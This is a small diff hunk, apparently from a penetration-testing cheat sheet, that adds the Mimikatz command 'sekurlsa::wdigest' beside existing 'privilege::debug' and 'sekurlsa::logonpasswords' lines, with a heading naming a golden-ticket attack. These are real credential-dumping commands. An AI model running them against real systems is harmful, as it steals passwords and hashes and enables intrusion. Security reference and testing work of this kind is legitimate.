@@ -13,6 +13,7 @@ Mimikatz console (multiple commands)
 PS C:\temp\mimikatz> .\mimikatz
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
 ```
 
 Mimikatz Golden ticket
